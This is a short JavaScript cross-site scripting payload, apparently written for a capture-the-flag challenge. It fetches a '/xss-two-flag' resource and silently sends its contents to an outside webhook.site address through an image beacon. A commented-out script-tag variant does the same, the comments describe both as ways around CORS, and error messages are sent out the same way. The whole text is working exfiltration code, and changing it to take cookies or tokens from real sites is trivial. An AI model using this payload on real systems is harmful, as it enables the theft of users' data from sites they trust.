fetch("/xss-two-flag")
  .then(r => r.text())
  .then(flag => {
    // === Silent exfil option 1: Image beacon (super reliable, no CORS issues) ===
    new Image().src = "https://webhook.site/efd89572-9c32-410f-a9c5-d9c746e25aba?flag=" + encodeURIComponent(flag);

    // === Or option 2: Script tag (also bypasses CORS completely) ===
    // const s = document.createElement("script");
    // s.src = "https://webhook.site/YOUR-UNIQUE-ID-HERE?flag=" + encodeURIComponent(flag);
    // document.body.appendChild(s);

    // Optional: error logging so you see if fetch fails for other reasons
  })
  .catch(e => {
    new Image().src = "https://webhook.site/efd89572-9c32-410f-a9c5-d9c746e25aba?error=" + encodeURIComponent(e.message);
  });
